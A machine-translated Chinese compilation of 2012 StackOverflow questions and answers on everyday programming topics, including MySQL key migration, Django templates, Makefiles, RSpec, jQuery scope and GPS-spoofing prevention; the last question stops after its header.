# StackOverflow 问答 11271000-11271999

# mysql - 更改主表 PK 并更新相关表 FK（在 Mysql 上将 PK 从 Autoincrement 更改为 UUID）

> ID：11271001
> 
> 赞同：0
> 
> 时间：2012-06-30T02:38:33.733
> 
> 标签：mysql, foreign-keys, uuid, create-table

我有两个相关的表：组和客户。客户属于组，所以我有一个外键“group_id”，它引用了客户所属的组。

我正在将 Group id 从自动增量更改为 UUID。所以我需要为每个组生成一个 UUID 并立即更新 Clients 表以反映更改并保持记录相关。

有没有办法通过 MySQL 上的多表更新来做到这一点？

添加表定义以进行说明。

```
CREATE TABLE `groups` (
  `id` char(36) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `created` datetime DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8$$

CREATE TABLE `clients` (
  `id` char(36) NOT NULL,
  `name` varchar(255) NOT NULL,
  `group_id` char(36) DEFAULT NULL,
  `active` tinyint(1) DEFAULT '1'
  PRIMARY KEY (`id`),
  KEY `fkgp` (`group_id`),
  CONSTRAINT `fkgp` FOREIGN KEY (`group_id`) REFERENCES `groups` (`id`) 
  ON DELETE NO ACTION ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8$$ 
```

# django - Django trans 和 url 标签

> ID：11271002
> 
> 赞同：21
> 
> 时间：2012-06-30T02:39:00.823
> 
> 标签：django, internationalization

我想在 Django 1.3 应用程序中翻译包含 URL 的段落。

```
<p>
    First <a href="{% url edit-profile username=user.username %}">edit your profile</a>, please.
</p> 
```

根据语言的不同，被`<a>`标签包围的文本肯定会发生变化。我怎样才能让翻译人员决定链接的位置？将整个事物包装在 a 中`{% trans %}`会导致错误：

```
<p>{% trans "First <a href='{% url edit-profile username=user.username %}'>edit your profile</a>, please." %}</p> 
```

抛出的错误是`TemplateSyntaxError: Searching for value. Unexpected end of string in column 64: trans "First <a href='{% url edit-profile username=user.username`.

我该怎么做呢？我是否必须确定视图中的 URL，然后将该 URL 作为字符串传递给模板？对于我认为非常常见的问题，这似乎是一个非常复杂的解决方案。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-06-30T02:45:27.203

使用`{% blocktrans %}`. [Django 翻译文档](https://docs.djangoproject.com/en/dev/topics/i18n/translation/)包括这个例子：

```
{% url path.to.view arg arg2 as the_url %}
{% blocktrans %}
This is a URL: {{ the_url }}
{% endblocktrans %} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-06-10T12:13:14.713

这对我有用：

```
{% url "app-name:name-of-view" as the_url %}
{% blocktrans %}
This is a URL: {{ the_url }}
{% endblocktrans %} 
```

# chat - 聊天程序设计

> ID：11271003
> 
> 赞同：1
> 
> 时间：2012-06-30T02:39:36.897
> 
> 标签：chat

我将开发一个基本功能类似于[http://www.providesupport.com](http://www.providesupport.com)和[http://www.liveperson.com/的实时帮助聊天系统](http://www.liveperson.com/)

我不确定如何构建应用程序。我想要一个基于 Web 的聊天脚本，供最终用户与我们的支持人员进行交互，他们将使用管理控制台来管理不同的聊天。我计划使用 PHP/JavaScript/AJAX 的组合来实现最终用户聊天和 Java 来构建管理面板。还将有一个 MySQL 数据库来存储设置/聊天等。

我想要包括的主要功能是： - 支持多个并发聊天 - 多个操作员 - 在操作员之间转移聊天 - “用户正在输入”通知 - 将每个聊天记录到数据库 - 在线/离线模式

我已经为系统的基本架构提出了三种可能的方法，特别是在聊天元素的工作方式方面。我不确定哪种方法最好，希望您能指出我正确的方向并指出我错过的任何优点/缺点。

**方法 1 - 用于聊天的静态 HTML 文件**

PHP 用户聊天框写入和读取包含聊天的 HTML 文件。然后每隔几秒钟重新加载此文件以确保显示更新。Java 管理端也会做类似的事情。

优点： - 消息全程记录。- 操作员可以通过加载不同的 HTML 文件来管理不同的聊天 - 不同的操作员可以加载相同的聊天，允许转移用户

缺点 - 用户输入通知需要一些单独的方法

**方法 2 - 存储聊天记录的 MySQL 数据库**

当输入每条新消息时，聊天将被写入 MySQL 数据库。然后管理员和用户端每隔几秒钟检查一次数据库中的更新，如果发生更新，则重新加载聊天窗口。

优点： - 由于每条消息都存储在 DB 中，因此会全程记录消息。- 操作员可以通过不同的 SQL 查询管理不同的聊天 - 不同的操作员可以加载相同的聊天，允许转移用户

缺点： - 用户输入通知需要一些单独的方法 - 数据库会变得非常大 - 不断查询数据库可能会导致服务器负载高，并且在使用大表时会变慢

**方法 3 - 直接套接字连接**

PHP Web 端有一个直接连接到他们正在与之交谈的 Java 管理客户端的套接字连接。所有的聊天数据都经过这个，然后当聊天结束后，写入数据库进行存储。

优点： - 会很快，因为各方都会知道何时收到新消息 - 可以通过套接字连接发送“用户正在键入”消息 - 记录数据

缺点： - 套接字连接可能会丢失，因此结束聊天。- 不确定操作员之间的聊天转移如何工作

**概括**

所以，总而言之，哪种方法最好？有没有更好的方法我没有想到？我看过 HTML5 网络套接字，但我需要一个良好的浏览器兼容性。

除此之外，如何根据管理员用户是否登录来实现在线/离线指示器？

我追求的是更通用的概述而不是代码等？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T02:46:12.660

您是否考虑过[socket.io](http://socket.io/)以获得真正的跨浏览器套接字？

否则，您可以使用已经为此开发的东西，而不是重新发明轮子，例如已经存在的 XMPP JS 库。

如果你想自己实现东西，你最好的办法是ajax长轮询，不要让你的页面不断重新加载，而是提供某种网络服务，并使用JS（或jQuery）与之通信，只传输聊天-相关数据。

# java - 用于加载文档和标记文本部分的 Java 库

> ID：11271007
> 
> 赞同：0
> 
> 时间：2012-06-30T02:40:53.777
> 
> 标签：java, swing, jtextcomponent, styleddocument

我是 Swing 开发的新手，我正在创建一个 Java 应用程序，用户可以在其中加载文本文档并标记部分文本。

然后将突出显示文本的标记部分，用户可以单击标记的文本来编辑/删除标签。有没有我可以用来实现这一目标的库/类。

我已经看过了`JTextArea`。但据我所知，它只能显示纯文本（*如果我错了，请纠正我*）

为了更清楚我在寻找什么：

当您在 Stack Overflow (SO) 上标记问题时，标签会用一个小框突出显示，并在标签周围突出显示。我在 Java 中寻找类似的东西。

所以，如果我添加的组件是 X，那么 X 应该能够保存纯文本和标记文本。标记的文本应该看起来像 SO 标记。

**编辑**

一个澄清的例子。

*原文：*

> 这是一些示例文本。

标记后，比如说样本，它应该是这样的：

*带标记文本*

![在此处输入图像描述](../Images/fa14334fd7f91163b922027145400748.png)

那 x 基本上是一个按钮，用于删除与**sample**关联的所有标签。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T04:52:45.950

这可以帮助你[jeditorpane 和 jtextpane](http://docs.oracle.com/javase/tutorial/uiswing/components/editorpane.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T05:46:12.587

[这里](https://stackoverflow.com/a/8534162/230513)有一个工作示例，使用`StyledEditorKit.ForegroundAction`. 它还在[`StyledEditorKit`](http://docs.oracle.com/javase/7/docs/api/javax/swing/text/StyledEditorKit.html).

![图片](../Images/fa8a498d20ce649a263ceb938c777103.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T04:46:41.043

我的想法是，取一个文本字段，当我们双击它设置为可编辑然后写入标签并按 Enter .. 然后更新标签，以突出显示使用 setBackground，setForeground 和文本字段

```
JTextField jt=new JTextField("tag"); 
```

将其设置为

```
jt.setEditabe(false); 
```

将 MouseListener 添加到 jt 查看此 LINK[**鼠标侦听器**](http://docs.oracle.com/javase/tutorial/uiswing/events/mouselistener.html)

```
jt.addMouseListener(this); 
```

在 mouseClicked 事件中编写代码，如果我们双击它将设置为可编辑状态

```
public void mouseClicked(MouseEvent e) {
    int count=0;
    count=e.getClickCount();
    if(count==2)
    {
        jt.setEditable(true);
        count=0;

    }

} 
```

[**然后编辑标签...做其余的代码，即通过使用键绑定**](http://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html)按回车更新标签，请参阅此链接

# node.js - 更新嵌套树 mongoDB、node.js 中的后代

> ID：11271009
> 
> 赞同：2
> 
> 时间：2012-06-30T02:41:48.473
> 
> 标签：node.js, mongodb, tree

有没有办法通过 id 或其他字段更新嵌套文档？

我使用“[单个文档中的完整树](http://www.mongodb.org/display/DOCS/Trees+in+MongoDB#TreesinMongoDB-FullTreeinSingleDocument)”并且事先不知道嵌套可以有多深。需要更新，例如，回答 {id:'104'}。我可以通过“点表示法”做到这一点，但由于我不知道嵌套的级别（深度），我无法预测我`'comment.answers.answers....answers.'`能走多长时间。

有什么方法可以直接查找和更新 id:'104'，还是我还需要通过某种深度标记？

```
{
 title:'some title',
 comment:
     {
        id:'101'
        author:'Joe',
        text:'some comment',
        answers:
        [
            {
              id:'102'
              author:'Joe',
              text:'first answer to comment',
              answers:
                    [
                       {
                           id:'103'
                           author:'Done',
                           text:'first answer to first answer to comment',
                           answers:[]
                       },
                       {
                           id:'104'
                           author:'Bob',
                           text:'Second answer to first answer to comment',
                           answers:[]
                       }

                    ]

            },

            {
            },

            {
            },
        ]
     }
} 
```

我使用[Node.JS MongoDB 驱动程序](http://mongodb.github.com/node-mongodb-native/index.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T04:41:35.897

我认为您**应该**存储每个节点的深度级别，然后动态创建查询。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-02T15:01:00.350

简而言之，没有真正好的方法来进行这种查询。有几个选项：

您可以使用长语句创建查询，`$or`为文档指定每个可能的嵌套位置：

```
{ comment.id: 103, $or [
                        { comment.answers.id: 103 }, 
                        { comment.answers.answers.id: 103 },
                        { comment.answers.answers.answers.id: 103 } 
                       ] 
} 
```

有关[$or 运算符的更多信息，请参阅文档](http://docs.mongodb.org/manual/reference/operators/#_S_or)。

事实上，更好和更可持续的解决方案是使用不同的模式，其中所有评论和答案都存储在一个平面数组中，然后存储有关`comments.parent`字段中评论之间关系的信息。例如：

```
 { comment: [
           { id: 1 }
           { id: 2, parent: 1 }
          ] } 
```

有关其他选项和对可能的注释层次建模方法的更深入讨论，请查看 MongoDB 文档中的[存储注释用例](http://docs.mongodb.org/manual/use-cases/storing-comments/)。

[MongoDB 中的 Trees 中](http://www.mongodb.org/display/DOCS/Trees+in+MongoDB)还有许多您可能需要考虑的策略。

# distributed-computing - 需要一个 9 字符长度的唯一 ID

> ID：11271011
> 
> 赞同：1
> 
> 时间：2012-06-30T02:42:16.723
> 
> 标签：distributed-computing

我的应用程序使用 9 位数字（也可以是字母数字）。我可以从任何数字开始，然后在开始时递增。但是我的应用程序不是单实例应用程序，所以如果我将它`exe`作为另一个实例运行，它应该增加最新值，并且前一个实例应该在需要该值时再次增加最新值。我的意思是在任何时候，该值都应该是我打开的所有实例中的最新增量值。

这是问题的一半。另一方面，`exe`s 可以在网络上的任何机器上运行，并且每个实例应该继续增加（就像时间永远不会倒退）再过 2 年。我的限制是我不能使用文件来存储和检索共同的最新值。

我怎样才能做到这一点？

一个 9 字符/数字的 UNIQUE NUMBER 也肯定有效。整个想法是为每个“机密文件”分配一个数字（9个字符长度的字符串）和（加密它和其他任何东西，这不是我的工作）

我试过：

1.  GUID 在总共 128 位中是唯一的，但不是最后一个或前 9 个字符
2.  刻度数超过 9
3.  MAC 地址仅在 12 个字符时唯一
4.  ISBN（图书编号系统）

等等 ...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T02:57:52.883

我认为最好的方法可能是拥有唯一号码服务器，您的每个应用程序实例都通过网络查询以获得唯一号码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T13:20:15.027

首先，您需要从问题中删除分布式方面。就像用户 Hugo 建议的那样，使用 IP 地址的最后 2 或 3 个字节应该可以工作。您的问题现在已简化为每台机器的本地问题。

您的算法可能需要能够处理重新启动，而不是在重新启动后开始分发相同的数字。您声明您没有选择使用文件通过文件系统存储和检索有关此机制的信息。这意味着单独的随机数生成器还不够好，您还需要在数字生成器中使用基于时间的组件。*如果您使用包含自某个日期*以来经过的秒数的 4 个字节，您将拥有超过 100 年的唯一性。但是，理想情况下，此处使用的时间尺度取决于您的数字的预期分发频率。现在，您的问题已简化为每台机器每一秒的本地问题。

然后可以使用最后的 2 或 3 个字节来确保第二个字节的本地唯一性。根据您的要求和操作系统，有多种 IPC 机制来管理它，如管道、套接字或共享内存。或者你可以想出更有创意的方法。如果您知道节点上参与的进程数，则可以在启动或配置时为每个进程分配一个序列号，并使用 2 或 3 个字节中的 1 个。您的唯一性问题现在已经成为您的流程本地的一秒钟，这应该是可行的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T02:50:22.920

为什么它必须是 9？如果那不限制您，UUID 会很棒。

无论如何，最好的办法是生成一个随机数。如果您的所有 PC 都在同一个网络中，请在开始时使用 IP 地址的主机位以避免冲突。在大多数情况下，这应该不超过 16 位或 24 位，因此您还有 6 位剩余数字。

# c - 多个.c文件的makefile，同一目录

> ID：11271014
> 
> 赞同：2
> 
> 时间：2012-06-30T02:43:57.213
> 
> 标签：c, gcc, compilation, makefile

我需要为 4 个文件创建一个 makefile：q4.c、q3.c、q2.c、q1.c 这 4 个文件的 makefile 格式是什么样的？我知道所有必要的标志，预处理、编译、汇编和清理，但是对于 4 个程序，文件的格式会是什么样子？

旁注：所有程序都在同一个目录中。

谢谢你的帮助-戴夫 L

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T03:08:59.303

Makefile 是一种非常全面和灵活的方式来描述构建过程及其操作、依赖项等。有很多可能的编写方式，因此您的问题永远不会有一个简单的单一答案。例如，对于您的简单案例，您的 Makefile 可能如下所示：

```
BIN = q1 q2 q3 q4

all: $(BIN)

clean:
    $(RM) $(BIN) 
```

如果您经常添加和删除源文件，并且每个文件都应编译为独立的可执行文件，它也可能看起来像这样：

```
SRC = $(wildcard *.c)
BIN = $(patsubst %.c,%,$(SRC))

all: $(BIN)

clean:
    $(RM) $(BIN) 
```

根据项目的规模和要求，它可能会变得越来越复杂。

我建议您从像上面的示例这样简单的东西开始，并阅读 Make[文档](http://www.gnu.org/software/make/manual/make.html)以了解它可以做什么。

此外，Make 是相当古老、复杂的技术。掌握它需要大量时间和练习，而您的反应却很少。有替代方案。我个人推荐[CMake](http://www.cmake.org/) - 它更容易，更高级别的系统可以为您生成构建脚本。它支持 Makefiles、Xcode 等等。看看肯定更糟。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T03:01:35.997

如果您使用的是 gnu make，并且每个标志都相同：

```
CFLAGS=-ffoo -O2 -fguess-at-hard-math
all: q1 q2 q3 q4 
```

否则，您可以明确指定每个

```
all: q1 q2 q3 q4
q1: q1.c
    gcc -o q1 q1.c
q2: q2.c 
    gcc -o q2 -fq2-flags q2.c
... 
```

# ruby-on-rails - RSpec 报告错误，但输出相同

> ID：11271017
> 
> 赞同：0
> 
> 时间：2012-06-30T02:45:15.237
> 
> 标签：ruby-on-rails, rspec, rspec-rails

我正在指定我的 VideoController 创建操作：

```
it 'creates a new video given valid parameters' do
  video = { :title=>"Example title", :description=>"Description", :url=>"http://www.youtube.com/watch?v=b6speA_XhP4", :provider=>"Youtube" }
  Video.should_receive(:save).with("title"=>"Example title", :description=>"Description", :provider=>"Youtube", :views=>0, :likes=>0, :provider_video_id=>'b6speA_XhP4', :thumb=>"http://img.youtube.com/vi/b6speA_XhP4/2.jpg")
  post :create, :video => video
end 
```

我收到一个错误：

```
1) VideosController POST create creates a new video given valid parameters
 Failure/Error: Video.should_receive(:save).with("title"=>"Example title", :description=>"Description", :provider=>"Youtube", :views=>0, :likes=>0, :provider_video_id=>'b6speA_XhP4', :thumb=>"http://img.youtube.com/vi/b6speA_XhP4/2.jpg")
   (<Video(id: integer, title: string, description: text, thumb: string, provider_video_id: string, provider: string, views: integer, likes: integer, created_at: datetime, updated_at: datetime) (class)>).save({"title"=>"Example title", :description=>"Description", :provider=>"Youtube", :views=>0, :likes=>0, :provider_video_id=>"b6speA_XhP4", :thumb=>"http://img.youtube.com/vi/b6speA_XhP4/2.jpg"})
       expected: 1 time
       received: 0 times 
```

但是，输出表明 RSpec 期望和结果是相同的：

```
# extracted from the output
# EXPECTATION :
"title"=>"Example title", :description=>"Description", :provider=>"Youtube", :views=>0, :likes=>0, :provider_video_id=>'b6speA_XhP4', :thumb=>"http://img.youtube.com/vi/b6speA_XhP4/2.jpg"
# RESULT :
"title"=>"Example title", :description=>"Description", :provider=>"Youtube", :views=>0, :likes=>0, :provider_video_id=>"b6speA_XhP4", :thumb=>"http://img.youtube.com/vi/b6speA_XhP4/2.jpg" 
```

**视频控制器**

```
def create
  method = 'get_' + params[:video][:provider] + '_video_id'
  params[:video][:provider_video_id] = Video.send(method, params[:video][:url])
  params[:video][:thumb] = Video.get_thumb_from_youtube(params[:video][:provider_video_id])
  params[:video][:views] = params[:video][:likes] = 0    

  @video = Video.new(params[:video])
  if @video.save!
    redirect_to video_path(@video), notice:'Video added successfully.'
  else
    render :new
  end
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T04:49:15.210

你传递参数的方式对我来说看起来很奇怪，对于你的情况

```
it 'creates a new video given valid parameters' do
  params = {:video => { :title=>"Example title", :description=>"Description", :url=>"http://www.youtube.com/watch?v=b6speA_XhP4", :provider=>"Youtube" }}
  Video.should_receive(:save).with(params[:video])
  post :create, params
end 
```

它接受参数的方式是散列的散列，它在您的规范中看起来缺失。

# iphone - 在 phonegap 项目中停止 iframe 重定向/打开移动 Safari

> ID：11271020
> 
> 赞同：5
> 
> 时间：2012-06-30T02:46:05.087
> 
> 标签：iphone, ios, iframe, cordova

目前，我一直在将页面加载到我的 phonegap 项目中的隐藏 iframe 中，作为从我在我的应用程序中使用的网站的移动版本中抓取数据的一种方式。

问题是某个特定站点具有某种类型的帧破坏器并发送重定向，该重定向退出应用程序并在移动浏览器中加载页面。

有没有办法停止重新加载？抛开刮擦的道德问题:-)

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-06-30T02:48:42.927

如果您使用的是 PhoneGap Build，请将其添加到您的`config.xml`文件中：

```
<preference name="stay-in-webview" value="true" /> 
```

如果您不使用 Build 将其设置在您的`Cordova.plist/Phongap.plist`：

```
OpenAllWhitelistURLsInWebView = 'Yes' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T03:17:34.807

[我在这篇文章http://craigpfau.com/2012/02/phonegap-ios-uiwebview-and-safari-app-links/](http://craigpfau.com/2012/02/phonegap-ios-uiwebview-and-safari-app-links/)中找到了答案

在 AppDelegate.m 中替换它

```
- (BOOL) webView:(UIWebView*)theWebView shouldStartLoadWithRequest: (NSURLRequest*)request navigationType:(UIWebViewNavigationType)navigationType
{
   NSURL *url = [request URL];

   if ([[url absoluteString] rangeOfString:@"URLToOpenInUIWebView.com"].location != NSNotFound) {
      return YES;
   }
   else {
      return [self.viewController webView:theWebView shouldStartLoadWithRequest:request navigationType:navigationType];
   }
} 
```

您不想在 UIwebview 中打开的任何链接都使用 target="_blank"

# php - CakePHP 休息 API 不工作

> ID：11271025
> 
> 赞同：0
> 
> 时间：2012-06-30T02:46:52.330
> 
> 标签：php, cakephp, rest

我有一个模型“Note”，它的控制器看起来像这样-http: [//pastebin.com/TqVJm7Uw](http://pastebin.com/TqVJm7Uw)

当我发送 GET 请求`http://hostname/notes.json`时，我可以看到 json 格式的注释。例如 - [http://pastebin.com/Haf6fq9S](http://pastebin.com/Haf6fq9S)

但是当我发送 GET 请求时，`http://hostname/notes/4febea9d928488a443000000.json`我会收到消息-

```
{"code":"404","url":"\/notes\/4febea9d928488a443000000.json","name":"Action NotesController::4febea9d928488a443000000() could not be found."} 
```

我的 route.php 文件看起来像这样 -

```
CakePlugin::routes();
Router::parseExtensions();
Router::parseExtensions('json');
Router::mapResources('notes');/**
require CAKE . 'Config' . DS . 'routes.php'; 
```

这里有什么问题？为什么索引的 REST 请求工作正常，但视图却不行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T21:04:05.003

我正在使用带有 CakePHP 的 MongoDB 数据源，当我切换回良好的旧 MySQL 驱动程序时，它开始工作得很好。不确定 MongoDB 数据源出了什么问题。

# iphone - 根据音频文件动态调整 UISlider 的大小

> ID：11271026
> 
> 赞同：1
> 
> 时间：2012-06-30T02:46:58.950
> 
> 标签：iphone, ios, xcode, ipad, uislider

用户从 MediaPicker 中选择一个 .mp3。我想根据 .mp3 的长度（以秒为单位）动态设置 UISlider 的宽度。UISlider 显示在 UIScrollView 中，计时器在音乐播放期间动画/滚动 UISlider（类似于 iMovie 中音轨的显示方式）。

**我的问题：如何设置 UISlider 的宽度，以便无论宽度如何（.mp3 长度以秒为单位），拇指都会以完全相同的速度“滚动”，并且不会根据歌曲的长度而改变. IE。对于一首短曲和一首长曲，拇指应该以完全相同的速度滚动，因为 UISlider 的宽度已根据音乐长度而变化。

我已经在这两天了。非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T04:54:15.280

使用 mp3 文件创建一个 AVAudioPlayer 实例。现在根据播放的音频文件设置滑块的最大值和最小值：

首先设置滑块的最小值。

```
yourslider.minimum = 0; 
```

现在使用 avaudioplayer 的 duration 属性在滑块中设置最大值，该属性给出 mp3 或任何音频文件的总持续时间：

```
 yourslider.maximum = ceilf(float)avaudioplayer.duration); 
```

# ruby - 在 Sinatra 中测试随机输出

> ID：11271028
> 
> 赞同：1
> 
> 时间：2012-06-30T02:47:43.103
> 
> 标签：ruby, rspec, sinatra

我最近一直在研究 Ruby，并且正在努力将一些东西放在一起以使用我正在学习的东西。

我有一个输出随机报价的 Sinatra 应用程序。我想对此进行一些 RSpec 测试，因为这似乎是正确的选择。

为了测试这个类，我做了这样的事情：

```
 it "prints a random line" do
     QuoteFile.any_instance.stub(:random).and_return(@quote.to_s)

     @quotefile.random.should == "Sample quote"
 end 
```

所以我把它放到了一个基本的 Sinatra 应用程序中。我的 RSpec 文件如下所示：

```
describe 'Quote App' do
    include Rack::Test::Methods

    def app
        Sinatra::Application
    end

    it "prints random quote" do

      get '/'
         ????
    end
end 
```

我的问题是：如何在“get '/' 中剔除随机方面？

多谢你们！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T15:32:15.373

采用

```
QuoteFile.any_instance.stub(:random).and_return("This is a random quote") 
```

在您的 Sinatra 测试中并检查输出。这是一个例子。

```
describe 'Quote App' do
  include Rack::Test::Methods

  def app
    Sinatra::Application
  end

  it "prints random quote" do
    QuoteFile.any_instance.stub(:random).and_return("This is a random quote")
    get '/'
    last_response.body.should =~ /This is a random quote/
  end
end 
```

# c# - 如何转换字典 字符串数组/列表？

> ID：11271029
> 
> 赞同：1
> 
> 时间：2012-06-30T02:48:24.923
> 
> 标签：c#, .net, arrays, string, dictionary

我想将字典转换为字符串数组（或列表）
字符串数组需要像这样返回：“ID，PTS”，其中 int 是 ID，long 是 PTS。

请帮忙！谢谢，
~尼库。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-30T02:58:28.763

```
var strings = dict.Select(item => string.Format("{0}, {1}", item.Key, item.Value)); 
```

请注意，这将返回一个枚举器。`string[]`无论您想要or形式的结果，`List<string>`您应该分别使用`.ToArray()`or `.ToList()`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T02:56:57.420

你可以这样做：

```
string[] arr =
  theDictionary
  .Select(kvp => kvp.Key.ToString() + ", " + kvp.Value.ToString())
  .ToArray(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T02:58:13.237

简单的答案是遍历字典，并将值复制到字符串列表中。

```
Dictionary<int, long> dict = new Dictionary<int, long>();

// If you like Linq. Stick a .ToArray() or .ToList() at the end, or leave it as IEnumerable<string>
var stringList = dict.Select(kvp => kvp.Key.ToString() + ", " + kvp.Value.ToString());

// If you don't like Linq.
List<string> stringList2 = new List<string>();
foreach (KeyValuePair<int, long> kvp in dict)
{
    stringList2.Add(kvp.Key.ToString() + ", " + kvp.Value.ToString());
} 
```

# python - GAE中的memcache在被获取后消失

> ID：11271030
> 
> 赞同：0
> 
> 时间：2012-06-30T02:48:35.553
> 
> 标签：python, google-app-engine, memcached

这似乎不对，当我做一个

```
memcache.add('key', data, 3600) 
```

和一个：

```
memcache.get('key') 
```

我得到了正确的结果。但是，如果我打电话

```
memcache.get('key) 
```

之后再次，它不再在内存缓存中。它似乎每次被提取一次后就消失了。难道我做错了什么？

# javascript - jQuery 在新对象中访问此事件

> ID：11271033
> 
> 赞同：0
> 
> 时间：2012-06-30T02:49:11.917
> 
> 标签：javascript, jquery

我想访问以下标记中的 data-global-id 值，但由于范围界定，我不确定如何执行此操作。

例如：

```
<div data-global-id="168" class="remove-as-favorite">remove as favorite</div>

$('.remove-as-favorite').on('click',function(){
  var global_id=$(this).data('global-id');
  // this works
  alert('here i am in something: ' + global_id);
  // this doesn't work
  event_handler.remove_as_favorite(); 
});

// want to access the data-global-id value in here; how to get access to this?
event_handler={
remove_as_favorite: function(){
    // how to get access to this here; assuming this refers to event_handler 
    var global_id=$(this).data('global-id');
    alert("here i am global_id:" + global_id);
  }
} 
```

谢谢

** 编辑 1 ** ![在此处输入图像描述](../Images/39fcaecb5b4cd82be8188367a4d34292.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T02:50:41.963

试试这个 bruv：**使用 global_id** [http://jsfiddle.net/HK55Q/8/](http://jsfiddle.net/HK55Q/8/) **或** [http://jsfiddle.net/HK55Q/11/的工作演示](http://jsfiddle.net/HK55Q/11/)

在代码中只是像这样在本地函数之外更改全局 id 的声明`var global_id = "";`

进一步的代码应该更好地解释，

**好读:)** [如何在 jQuery 中存储全局值（不一定是全局变量）？](https://stackoverflow.com/questions/2866866/jquery-global-variable-best-practice-options)

希望它有帮助，让我知道我是否错过了什么

**代码**

```
var global_id = ""; //<=== See here the global_id variable is outside your click and now you can bind it and can use it again.

$('.remove-as-favorite').on('click',function(){
  global_id=$(this).data('global-id'); //<== Do not redeclare it using var global_id
  // this works
  alert('here i am in something: ' + global_id);
  // this doesn't work
  event_handler.remove_as_favorite(); 
});

// want to access the data-global-id value in here; how to get access to this?
event_handler={
remove_as_favorite: function(){
    // how to get access to this here; assuming this refers to event_handler 
    var global_id=$(this).data('global-id');
    alert("here i am global_id:" + global_id);
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T03:04:44.597

你可以做几件事中的一件。我能看到的最简单的方法是将 global_id 作为参数传递给 remove_as_favorite 函数，它看起来像这样：

```
$('.remove-as-favorite').on('click',function(){
  var global_id=$(this).data('global-id');
  event_handler.remove_as_favorite(global_id); 
});

// want to access the data-global-id value in here; how to get access to this?
event_handler={
remove_as_favorite: function(global_id){
    alert("here i am global_id:" + global_id); 
```

} }

另一种方法是使用“调用”或“应用”功能。

[https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/Call](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/Call)

```
$('.remove-as-favorite').on('click',function(){
  var global_id=$(this).data('global-id');
  event_handler.remove_as_favorite.call(this); 
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T06:09:41.327

一个更简单的例子是使用如下调用：​</p>

```
$(function(){
    $('.remove-as-favorite').on('click',function(){
        var global_id=$(this).data('global-id');
        alert('here i am in something: ' + global_id);
        event_handler.remove_as_favorite.call({global_id:global_id}); 
    });

    event_handler = {
        remove_as_favorite: function() {
            alert("here i am global_id:" + this.global_id);
        }
    }
});​ 
```

并且 call 是一个javascript函数，并且兼容所有支持javascript的浏览器；）

检查小提琴：http: [//jsfiddle.net/nTq97/](http://jsfiddle.net/nTq97/)

# javascript - 在 HTML5 中防止 GPS 校对的方法？

> ID：11271036
> 
> 赞同：0
> 
> 时间：2012-06-30T02:49:58.740
> 
> 标签：javascript, html, geolocation

我正在考虑如何通过模拟器模拟位置来防止 HTML5 中的 GPS 欺骗。

这些是我的一些想法：

1.  采集一个以上的样本。在实际情况下，GPS 位置应该是移动的。实际情况应该会有一些差异。

2.  使用密钥加密数据，使欺骗者无法看到发送到服务器的内容。但是，通过查看代码中的 alogthrm，他们可能能够查看发送到服务器的内容。

我知道在实际情况下这并不容易。但是，我仍然想阻止一些情况。你有什么其他的建议？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T02:57:33.427

这是基于对[规范](http://dev.w3.org/geo/api/spec-source.html#introduction)的根本误解。它明确指出：

> “位置信息的常见来源包括全球定位系统 (GPS) 和从网络信号（如 IP 地址、RFID、WiFi 和蓝牙 MAC 地址、GSM/CDMA 小区 ID）以及**用户输入**推断的位置。不保证API 返回设备的实际位置。"

换句话说，您徒劳地试图阻止规范明确允许的事情。

从技术上讲，创建任意用户输入也不难。一些高速公路非常直，所以一条带有小的随机垂直误差的直路很可能是有人在开车。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T03:01:24.517

正如@Pointy 所说，从纯粹的技术角度来看，这是一个困难的问题，尽管我可能会在极短的时间内查看从一个位置突然“传送”到另一个位置的监控帐户。如果一分钟他们在上大学，一分钟后他们在城对面的星巴克（或更远的地方），那么有些事情发生了。

一个简单的检查是跟踪每个用户最近的“真实”位置，然后仅当旧位置和新位置之间的距离矢量在一定范围内时才允许更新他们的位置。

然而，这假设防止欺骗的原因是阻止人们“破坏”他们的帐户并根据他们的位置声称某些东西（如游戏四方或其他）。

# android - OnClickListener 只增加一次

> ID：11271041
> 
> 赞同：0
> 
> 时间：2012-06-30T02:50:37.337
> 
> 标签：android, button, increment, onclicklistener

